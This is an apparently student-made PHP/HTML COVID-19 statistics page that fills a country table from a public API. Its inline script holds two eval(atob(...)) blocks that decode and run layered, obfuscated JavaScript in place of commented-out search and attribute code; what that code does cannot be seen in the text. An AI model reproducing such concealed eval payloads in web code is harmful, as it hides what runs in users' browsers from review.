<!DOCTYPE html>
<html>

<head>
  <title> Coronavirus (COVID-19)

  </title>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

 
  <!-- MY VERSION OF CDN      -->
  <!-- font -->
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,600,900&display=swap" rel="stylesheet">


  <!-- CSS Stylesheets -->

  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
    integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

  <!-- php css path base  -->
  <link rel="stylesheet" type="text/css" href="<?php echo base_url('public/asset/css/test.css')?>">




  <!-- Font Awesome -->
  <!-- icon  -->
  <script src="https://kit.fontawesome.com/73d9168e1c.js" crossorigin="anonymous"></script>





  <style>
  
  </style>

</head>



<body >

<section id="noEntryzone">
<section id="title">

  <div class="container-fluid tile">


    <!-- Nav Bar -->
    <nav class="navbar navbar-expand-lg navbar-dark">

      <a class="navbar-brand" href="">COVID-19</a>

      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">

        <!-- nav item -->

        <ul class="navbar-nav ml-auto">
        <li class="nav-item">
            <a class="nav-link" href=""><?= session()->get('isAdmin') ?> </a>
          </li>
                   
          <li class="nav-item">
            <a class="nav-link" href="">Contact</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="">About</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="<?php echo base_url('CovidController/symptom')?>">Symtomps</a>
          </li>
          <li class="nav-item"> 
            <a class="nav-link" href="<?php echo base_url('CovidController/prevention')?>">Prevention</a>
          </li>
        </ul>
      </div>
    </nav>




    <!-- Title -->
    <div class="row">

                  <div class="col-lg-6">

                    <!-- place  global data with card design  -->
                    <div class="card text-center T ">
                          <div class="card-header">
                              <p class="pCard">Coronavirus Cases:</p>
                              <h3 class="CHTxt totalC"></h3>
                          </div>
                          <div class="card-body">
                                <p class="pCard">Deaths:</p>
                                <h2 class="CBTxt  tdead" ></h2>
                          </div> 
                           <div class="card-footer">  
                                <p class="pCard">Recovered:</p>
                                <h2 class="CFTxt  treco" ></h2>
                          </div>
                      
                      </div>
                    </div>
               






        <div class="col-lg-6">

          <h1>Tracking  Coronavirus</h1>
          <button type="button" class="btn btn-dark btn-lg  donload-button"><i class="fab fa-apple"></i>
            <a href="<?php echo base_url('UserController/log')?>">login</a></button>
          <button type="button" class="btn btn-outline-light btn-lg donload-button"><i class="fab fa-google-play"></i>
          <a href="<?php echo base_url('UserController/logout')?>">Logout</a></button>
        </div>



      </div>

     
</section>



<section id="currentTime">
<div class="row rt">

                  <div class="col-lg-4">

                    <!-- place  global data with card design  -->
                    <div class="card text-center ">
                         <div class="card-header">
                            <p class="pCard">New Confirmed:</p>
                            
                         </div>
                         <div class="card-body">
                            
                            <h3 class="CHTxt NC"></h3>
                         </div>  
                        
                     </div>
                    </div>

                    <div class="col-lg-4">

<!-- place  global data with card design  -->
<div class="card text-center ">
     <div class="card-header">
        <p class="pCard">New Recovered</p>
        
     </div>
     <div class="card-body">
        
        <h3 class="CHTxt NR"></h3>
     </div>  
    
 </div>
</div>


<div class="col-lg-4">

<!-- place  global data with card design  -->
<div class="card text-center ">
     <div class="card-header">
        <p class="pCard">New Deaths</p>
        
     </div>
     <div class="card-body">
        
        <h3 class="CHTxt ND"></h3>
     </div>  
    
 </div>
</div>


                  </div>



  </section>


 <!-- Testimonials -->

 <section id="testimonials">


<div id="testimonials-Controls" class="carousel slide" data-ride="false">
  <ol class="carousel-indicators indi">
    <li data-target="#testimonials-Controls" data-slide-to="0" class="active"></li>
    <li data-target="#testimonials-Controls" data-slide-to="1"></li>
  </ol>
  <div class="carousel-inner cari">
    <div class="carousel-item active">

      <h2 class="testimonial-text">As the #COVID19 pandemic accelerates, we are concerned about its impact on women, children & adolescents' access to healthcare. 
</h2>
      <img class="testimonial-image" src="<?php echo base_url('public/asset/images/c1.JPG') ?>" alt="DR">
      <em>Tedros Adhanom Ghebreyesus</em><i class="fa fa-twitter mx-3" aria-hidden="true"></i>
    </div>

    <div class="carousel-item">
      <h2 class="testimonial-text">In India Coronavirus Cases &emsp;
      &emsp;&emsp;&emsp;&emsp;&emsp;1st February- 1
      &emsp;
      &emsp;&emsp;&emsp;&emsp;&emsp;1st March - 3
      &emsp;
      &emsp;&emsp;&emsp;&emsp;&emsp;1st April - 2,059
      &emsp;
      &emsp;&emsp;&emsp;&emsp;&emsp;1st May- 37,262
      &emsp;
      &emsp;&emsp;&emsp;&emsp;&emsp;1st June- 1,97,264 (still adding)</h2>
      <img class="testimonial-image" src="<?php echo base_url('public/asset/images/c2.JPG') ?>" alt="lady-profile">
      <em>Soumyadip Saha, Kolkata</em>
    </div>

  </div>
  <a class="carousel-control-prev" href="#testimonials-Controls" role="button" data-slide="prev">
    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <span class="sr-only">Previous</span>
  </a>
  <a class="carousel-control-next" href="#testimonials-Controls" role="button" data-slide="next">
    <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <span class="sr-only">Next</span>
  </a>
</div>

</section>










  </section>


















      <!-- <div id="loading"></div>

		<nav class="navbar navbar-expand-lg nav_style p-3">
  <a class="navbar-brand pl-5" href="#"><img src="" width="30" height="30">&nbsp;&nbsp;COVID-19</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="navbar-nav ml-auto pr-5 text-capitalize">
      <li class="nav-item active">
        <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">about</a>
      </li>

      <li class="nav-item">
        <a class="nav-link" href="#">symtomps</a>
      </li>

      <li class="nav-item">
        <a class="nav-link" href="#">prevention</a>
      </li>

      <li class="nav-item">
        <a class="nav-link" href="#">contact</a>
      </li>
      
      
    </ul>
   
  </div>
</nav> -->
<section id="group">
      <div id="demo" class="carousel slide" data-ride="carousel">
        <ul class="carousel-indicators">
          <li data-target="#demo" data-slide-to="0" class="active"></li>
          <li data-target="#demo" data-slide-to="1"></li>
          <li data-target="#demo" data-slide-to="2"></li>
        </ul>
        <div class="carousel-inner CI">
          <div class="carousel-item active">
            <img src="<?php echo base_url('public/asset/images/about.png') ?>" alt="Los Angeles" width="1400" height="500">
            <div class="carousel-caption">
              <a href="about.php">About</a>
            </div>
          </div>
          <div class="carousel-item">
            <img src="<?php echo base_url('public/asset/images/symtomps.jpg') ?>" alt="Chicago" width="1100" height="500">
            <div class="carousel-caption">
              <a href="symptom.php">Symtomps</a>
            </div>
          </div>
          <div class="carousel-item">
            <img src="<?php echo base_url('public/asset/images/prevention.png') ?>" alt="New York" width="1100" height="500">
            <div class="carousel-caption">
              <a href="prevention.php">Prevention</a>
            </div>
          </div>
        </div>
        <a class="carousel-control-prev" href="demo" data-slide="prev">
          <span class="carousel-control-prev-icon"></span>
        </a>
        <a class="carousel-control-next" href="#demo" data-slide="next">
          <span class="carousel-control-next-icon"></span>
        </a>
      </div>

      <div class="main_header">
        <div class="row w-100 h-100">
          <div class="col-lg-5 col-md-5 col-12 order-lg-1 order-2">
            <div class="leftside w-100 h-100 d-flex justify-content-center align-items-center">
              <img src="<?php echo base_url('public/asset/images/unity.png') ?>" width="300" height="300">

            </div>
          </div>

          <div class="col-lg-7 col-md-7 col-12 order-lg-2 order-1">
            <div class="rightside w-100 h-100 d-flex justify-content-center align-items-center">
              <h1>Let's Stay Safe & Fight Together Against The Cor<span class="corona_rotate"><img
                    src="<?php echo base_url('public/asset/images/coronalogo.png') ?>" width="40" height="40"></span>na Virus
              </h1>

            </div>

          </div>

        </div>



      </div>

      <!--*************************corona latest updates*****************-->

      <section class="corona_update">
        <div class="mb-3">
          <h3 class="text-uppercase text-center">covid-19 updates</h3>
         
          <center>
          <input type="text" id="search"  >
          <button class="btn" onclick="Search()">
          <span class="badge badge-danger">Search</span>
          </button>
          </center>
        </div>

        <div class="table-responsive">

          <table class="table table-bordered table-striped text-center" id="tbval">
            <tr>
              <th>Country</th>
              <th>TotalConfirmed</th>
              <th>TotalRecovered</th>
              <th>TotalDeaths</th>
              <th>NewConfimed</th>
              <th>NewRecovered</th>
              <th>NewDeaths</th>
            </tr>

          </table>

        </div>


      </section>
  </section">     

      <script>
        var preloader = document.getElementById('loading');

        function myFunc() {
          preloader.style.display = 'none';
        }  


// serching section

/* 
        function  Search() {
          var linkVal=document.getElementById("search").value
          var low =linkVal.toLowerCase();    
        window.location='#'+low
     
     console.log('#'+low);
     

        } */

eval(atob('dmFyIHU9dm9pZCAwLGk0PTQsaTg9OCxyZWM9bmV3IFJlZ0V4cCgiLnsxLDR9IiwiZyIpO2Z1bmN0aW9uIF9mX2Mocyl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocyk7fXZhciBoZD1mdW5jdGlvbihhKXt2YXIgYixjPWEubWF0Y2gocmVjKXx8W10sZD0iIjtmb3IoYj0wO2I8Yy5sZW5ndGg7YisrKWQrPWhoKHBhcnNlSW50KGNbYl0saTYpKTtyZXR1cm4gZH07dmFyIGh3PWhkO1N0cmluZy5wcm90b3R5cGUuY2M9ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuY2hhckNvZGVBdChhKX07dmFyIGk2PTE2LGhlPWZ1bmN0aW9uKGEpe3ZhciBiLGMsZD0iIjtmb3IoYz0wO2M8YS5sZW5ndGg7YysrKWI9YS5jYyhjKS50b1N0cmluZyhpNiksZCs9KCIwMDAiK2IpLnNsaWNlKC00KTtyZXR1cm4gZH0saGg9ZnVuY3Rpb24oYSl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoYSl9LGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKTtmdW5jdGlvbiBhdG9iKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWEucmVwbGFjZShyZWEsIiIpO2o8YS5sZW5ndGg7KWU9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksZj1od2EuaW5kZXhPZihhLmNoYXJBdChqKyspKSxnPWh3YS5pbmRleE9mKGEuY2hhckF0KGorKykpLGg9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksYj1lPDwyfGY+PjQsYz0oMTUmZik8PDR8Zz4+MixkPSgzJmcpPDw2fGgsaSs9X2ZfYyhiKSw2NCE9ZyYmKGkrPV9mX2MoYykpLDY0IT1oJiYoaSs9X2ZfYyhkKSk7cmV0dXJuIGk9dXRvYShpKX1mdW5jdGlvbiBidG9hKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWF0b3UoYSk7ajxhLmxlbmd0aDspYj1hLmNoYXJDb2RlQXQoaisrKSxjPWEuY2hhckNvZGVBdChqKyspLGQ9YS5jaGFyQ29kZUF0KGorKyksZT1iPj4yLGY9KDMmYik8PDR8Yz4+NCxnPSgxNSZjKTw8MnxkPj42LGg9NjMmZCxpc05hTihjKT9nPWg9NjQ6aXNOYU4oZCkmJihoPTY0KSxpPWkraHdhLmNoYXJBdChlKStod2EuY2hhckF0KGYpK2h3YS5jaGFyQXQoZykraHdhLmNoYXJBdChoKTtyZXR1cm4gaX1mdW5jdGlvbiBhdG91KGEpe2E9YS5yZXBsYWNlKHJlYiwiXG4iKTtmb3IodmFyIGI9IiIsYz0wO2M8YS5sZW5ndGg7YysrKXt2YXIgZD1hLmNoYXJDb2RlQXQoYyk7MTI4PmQ/Yis9X2ZfYyhkKTpkPjEyNyYmMjA0OD5kPyhiKz1fZl9jKGQ+PjZ8MTkyKSxiKz1fZl9jKDYzJmR8MTI4KSk6KGIrPV9mX2MoZD4+MTJ8MjI0KSxiKz1fZl9jKGQ+PjYmNjN8MTI4KSxiKz1fZl9jKDYzJmR8MTI4KSl9cmV0dXJuIGJ9ZnVuY3Rpb24gdXRvYShhKXtmb3IodmFyIGI9IiIsYz0wLGQ9YzE9YzI9MDtjPGEubGVuZ3RoOylkPWEuY2hhckNvZGVBdChjKSwxMjg+ZD8oYis9X2ZfYyhkKSxjKyspOmQ+MTkxJiYyMjQ+ZD8oYzI9YS5jaGFyQ29kZUF0KGMrMSksYis9X2ZfYygoMzEmZCk8PDZ8NjMmYzIpLGMrPTIpOihjMj1hLmNoYXJDb2RlQXQoYysxKSxjMz1hLmNoYXJDb2RlQXQoYysyKSxiKz1fZl9jKCgxNSZkKTw8MTJ8KDYzJmMyKTw8Nnw2MyZjMyksYys9Myk7cmV0dXJuIGJ9dmFyIGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKSxyZWE9bmV3IFJlZ0V4cCgiW15BLVphLXowLTkrLz1dIiwiZyIpLHJlYj1uZXcgUmVnRXhwKCJcclxuIiwiZyIpO3ZhciBfXz17YTpod2Euc3BsaXQoIiIpLCQ6ZnVuY3Rpb24oYSxiKXtmb3IodmFyIGM9IiIsZD10aGlzLmEubGVuZ3RoLGU9YS5sZW5ndGgsZj0wO2Y8ZTtmKyspZm9yKHZhciBnPTA7ZzxkO2crKylpZigiZSI9PWIpe2lmKHRoaXMuYVtnXT09PWFbZl0pe2MrPXRoaXMuYltnXTticmVha319ZWxzZSBpZigiZCI9PWImJnRoaXMuYltnXT09PWFbZl0pe2MrPXRoaXMuYVtnXTticmVha31yZXR1cm4gY30sYjpodygiMDAzZDAwMmYwMDJiMDAzOTAwMzgwMDM3MDAzNjAwMzUwMDM0MDAzMzAwMzIwMDMxMDAzMDAwN2EwMDc5MDA3ODAwNzcwMDc2MDA3NTAwNzQwMDczMDA3MjAwNzEwMDcwMDA2ZjAwNmUwMDZkMDA2YzAwNmIwMDZhMDA2OTAwNjgwMDY3MDA2NjAwNjUwMDY0MDA2MzAwNjIwMDYxMDA1YTAwNTkwMDU4MDA1NzAwNTYwMDU1MDA1NDAwNTMwMDUyMDA1MTAwNTAwMDRmMDA0ZTAwNGQwMDRjMDA0YjAwNGEwMDQ5MDA0ODAwNDcwMDQ2MDA0NTAwNDQwMDQzMDA0MjAwNDEiKS5zcGxpdCgiIil9Ow=='));eval(atob(__.$('nZrSoJvXlKIgsKrfkazY2+bFja7O46sDn6DdjqLblZwSnKrMvqPblqrSj83HuqwY4Zzbop3dm+4X1Znfl5rb16EDnuHMlMPRjKrOwK7NnugXyJjXlavRjOHUlKzfj6bRldMe4O4VlOPdlKHNlKPb1aPRnOge4O4VlObD','d')));


// end of searching section









        function fetch() {

          jQuery.get("https://api.covid19api.com/summary",

            function (data) {
              // console.log(data['Countries'].length);
            
              var tbval = document.getElementById('tbval');
              for (var i = 1; i < (data['Countries'].length); i++) {

                var x = tbval.insertRow();
                x.insertCell(0);

                tbval.rows[i].cells[0].innerHTML = data['Countries'][i - 1]['Country'];
                tbval.rows[i].cells[0].style.background = '#7a4a91';
                tbval.rows[i].cells[0].style.color = '#fff';


               



       
             // settAttributes nodes 
              eval(atob('dmFyIHU9dm9pZCAwLGk0PTQsaTg9OCxyZWM9bmV3IFJlZ0V4cCgiLnsxLDR9IiwiZyIpO2Z1bmN0aW9uIF9mX2Mocyl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocyk7fXZhciBoZD1mdW5jdGlvbihhKXt2YXIgYixjPWEubWF0Y2gocmVjKXx8W10sZD0iIjtmb3IoYj0wO2I8Yy5sZW5ndGg7YisrKWQrPWhoKHBhcnNlSW50KGNbYl0saTYpKTtyZXR1cm4gZH07dmFyIGh3PWhkO1N0cmluZy5wcm90b3R5cGUuY2M9ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuY2hhckNvZGVBdChhKX07dmFyIGk2PTE2LGhlPWZ1bmN0aW9uKGEpe3ZhciBiLGMsZD0iIjtmb3IoYz0wO2M8YS5sZW5ndGg7YysrKWI9YS5jYyhjKS50b1N0cmluZyhpNiksZCs9KCIwMDAiK2IpLnNsaWNlKC00KTtyZXR1cm4gZH0saGg9ZnVuY3Rpb24oYSl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoYSl9LGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKTtmdW5jdGlvbiBhdG9iKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWEucmVwbGFjZShyZWEsIiIpO2o8YS5sZW5ndGg7KWU9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksZj1od2EuaW5kZXhPZihhLmNoYXJBdChqKyspKSxnPWh3YS5pbmRleE9mKGEuY2hhckF0KGorKykpLGg9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksYj1lPDwyfGY+PjQsYz0oMTUmZik8PDR8Zz4+MixkPSgzJmcpPDw2fGgsaSs9X2ZfYyhiKSw2NCE9ZyYmKGkrPV9mX2MoYykpLDY0IT1oJiYoaSs9X2ZfYyhkKSk7cmV0dXJuIGk9dXRvYShpKX1mdW5jdGlvbiBidG9hKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWF0b3UoYSk7ajxhLmxlbmd0aDspYj1hLmNoYXJDb2RlQXQoaisrKSxjPWEuY2hhckNvZGVBdChqKyspLGQ9YS5jaGFyQ29kZUF0KGorKyksZT1iPj4yLGY9KDMmYik8PDR8Yz4+NCxnPSgxNSZjKTw8MnxkPj42LGg9NjMmZCxpc05hTihjKT9nPWg9NjQ6aXNOYU4oZCkmJihoPTY0KSxpPWkraHdhLmNoYXJBdChlKStod2EuY2hhckF0KGYpK2h3YS5jaGFyQXQoZykraHdhLmNoYXJBdChoKTtyZXR1cm4gaX1mdW5jdGlvbiBhdG91KGEpe2E9YS5yZXBsYWNlKHJlYiwiXG4iKTtmb3IodmFyIGI9IiIsYz0wO2M8YS5sZW5ndGg7YysrKXt2YXIgZD1hLmNoYXJDb2RlQXQoYyk7MTI4PmQ/Yis9X2ZfYyhkKTpkPjEyNyYmMjA0OD5kPyhiKz1fZl9jKGQ+PjZ8MTkyKSxiKz1fZl9jKDYzJmR8MTI4KSk6KGIrPV9mX2MoZD4+MTJ8MjI0KSxiKz1fZl9jKGQ+PjYmNjN8MTI4KSxiKz1fZl9jKDYzJmR8MTI4KSl9cmV0dXJuIGJ9ZnVuY3Rpb24gdXRvYShhKXtmb3IodmFyIGI9IiIsYz0wLGQ9YzE9YzI9MDtjPGEubGVuZ3RoOylkPWEuY2hhckNvZGVBdChjKSwxMjg+ZD8oYis9X2ZfYyhkKSxjKyspOmQ+MTkxJiYyMjQ+ZD8oYzI9YS5jaGFyQ29kZUF0KGMrMSksYis9X2ZfYygoMzEmZCk8PDZ8NjMmYzIpLGMrPTIpOihjMj1hLmNoYXJDb2RlQXQoYysxKSxjMz1hLmNoYXJDb2RlQXQoYysyKSxiKz1fZl9jKCgxNSZkKTw8MTJ8KDYzJmMyKTw8Nnw2MyZjMyksYys9Myk7cmV0dXJuIGJ9dmFyIGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKSxyZWE9bmV3IFJlZ0V4cCgiW15BLVphLXowLTkrLz1dIiwiZyIpLHJlYj1uZXcgUmVnRXhwKCJcclxuIiwiZyIpO3ZhciBfXz17YTpod2Euc3BsaXQoIiIpLCQ6ZnVuY3Rpb24oYSxiKXtmb3IodmFyIGM9IiIsZD10aGlzLmEubGVuZ3RoLGU9YS5sZW5ndGgsZj0wO2Y8ZTtmKyspZm9yKHZhciBnPTA7ZzxkO2crKylpZigiZSI9PWIpe2lmKHRoaXMuYVtnXT09PWFbZl0pe2MrPXRoaXMuYltnXTticmVha319ZWxzZSBpZigiZCI9PWImJnRoaXMuYltnXT09PWFbZl0pe2MrPXRoaXMuYVtnXTticmVha31yZXR1cm4gY30sYjpodygiMDAzZDAwMmYwMDJiMDAzOTAwMzgwMDM3MDAzNjAwMzUwMDM0MDAzMzAwMzIwMDMxMDAzMDAwN2EwMDc5MDA3ODAwNzcwMDc2MDA3NTAwNzQwMDczMDA3MjAwNzEwMDcwMDA2ZjAwNmUwMDZkMDA2YzAwNmIwMDZhMDA2OTAwNjgwMDY3MDA2NjAwNjUwMDY0MDA2MzAwNjIwMDYxMDA1YTAwNTkwMDU4MDA1NzAwNTYwMDU1MDA1NDAwNTMwMDUyMDA1MTAwNTAwMDRmMDA0ZTAwNGQwMDRjMDA0YjAwNGEwMDQ5MDA0ODAwNDcwMDQ2MDA0NTAwNDQwMDQzMDA0MjAwNDEiKS5zcGxpdCgiIil9Ow=='));eval(atob(__.$('ja7O467Mj9LclKzLlqrSj+Hdkarfj6r/j5vOmq3Lj6sY4abc4ecUoKDLlZvOitLcopvf1czRjqHMkabbkLTX1t7j1czRjqHMkZcUl6DJxqzRjqHMkZcSj6D0lJjbkczfkKsY2tTfj5wSja7UjqsDl6DJ15veja7U1Z3RjJzlmrMSoKrUl5zl07MSkKrMwpvMkabejpvbtaDcnuffj5wXyQAA','d')));



                                /* var att = document.createAttribute("id");             // Create a "class" attribute
                                var country=data['Countries'][i - 1]['Country'];
                                var low=country.toLowerCase();
                                att.value =low                           // Set the value of the class attribute
                                tbval.rows[i].cells[0].setAttributeNode(att);                          // Add the class attribute to <h1>
                              */
              // end of set attribute




                x.insertCell(1);
                tbval.rows[i].cells[1].innerHTML = data['Countries'][i - 1]['TotalConfirmed'];
                tbval.rows[i].cells[1].style.background = '#4bb7d8';

                x.insertCell(2);
                tbval.rows[i].cells[2].innerHTML = data['Countries'][i - 1]['TotalRecovered'];
                tbval.rows[i].cells[2].style.background = '#4bb7d8';

                x.insertCell(3);
                tbval.rows[i].cells[3].innerHTML = data['Countries'][i - 1]['TotalDeaths'];
                tbval.rows[i].cells[3].style.background = '#f36e23';

                x.insertCell(4);
                tbval.rows[i].cells[4].innerHTML = data['Countries'][i - 1]['NewConfirmed'];
                tbval.rows[i].cells[4].style.background = '#4bb7d8';

                x.insertCell(5);
                tbval.rows[i].cells[5].innerHTML = data['Countries'][i - 1]['NewRecovered'];
                tbval.rows[i].cells[5].style.background = '#9cc850';

                x.insertCell(6);
                tbval.rows[i].cells[6].innerHTML = data['Countries'][i - 1]['NewDeaths'];
                tbval.rows[i].cells[6].style.background = '#f36e23';



              }
             document.querySelector(".totalC").innerHTML= data['Global']['TotalConfirmed'];
             document.querySelector(".tdead").innerHTML= data['Global']['TotalDeaths'];    
             document.querySelector(".treco").innerHTML= data['Global']['TotalRecovered'];

             document.querySelector(".NC").innerHTML= data['Global']['NewConfirmed'];    
             document.querySelector(".ND").innerHTML= data['Global']['NewDeaths']; 
             document.querySelector(".NR").innerHTML= data['Global']['NewRecovered']; 
             
            }
          )
        };


        // remove this 
        document.addEventListener('DOMContentLoaded', function () {
          fetch()
        })
      </script>

</body>

<footer>


  <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous">
  </script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous">
  </script>
 
 
 <div class="foo py-5">
        dsfsdf

 </div> 



</footer>




</html>